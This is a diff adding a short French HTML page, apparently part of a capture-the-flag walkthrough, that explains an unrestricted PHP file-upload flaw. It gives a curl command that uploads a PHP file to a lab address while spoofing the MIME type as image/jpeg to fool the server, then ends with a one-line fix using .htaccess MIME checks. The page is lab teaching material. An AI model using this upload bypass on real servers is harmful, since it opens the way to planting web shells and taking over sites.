@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Upload fichier php</title>
+	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+	<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+		<a class="navbar-brand" href="#">Faille numero 12 : Upload fichier php</a>
+		<ul class="navbar-nav mr-auto">
+			<li class="nav-item">
+        		<a class="nav-link" href="../../manuel.html">retour</a>
+      		</li>
+		</ul>
+	</nav>
+	<div align="center">
+		<h1 class="mt-4">Upload fichier php a la place d'une image</h1>
+
+		<h3 class="mt-5">Exploitation de la faille : </h3>
+
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 1 : </h5>
+			<p class="lead">On creer un fichier php vide ou avec des lignes de code</p>
+			<img src="img/1.png" class="mt-4 om">
+		</div>
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 2 : </h5>
+			<p class="lead">On execute la commande curl suivante :<br>curl -s -X POST -F "uploaded=@chemin vers votre fichier php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.38/index.php?page=upload" | grep -e 'flag'<br>le 
+			image/jpeg est tres important car il permet de faire croire au serveur que le mime du fichier et celui d'une image</p>
+			<img src="img/2.png" class="mt-4 img_sh om">
+		</div>
+		<h3 class="mt-5">Protection de la faille : </h3>
+
+		<p class="mt-5 lead">utiliser un htacess pour verifier les mimes</p>
+	</div>
+</body>
+</html>
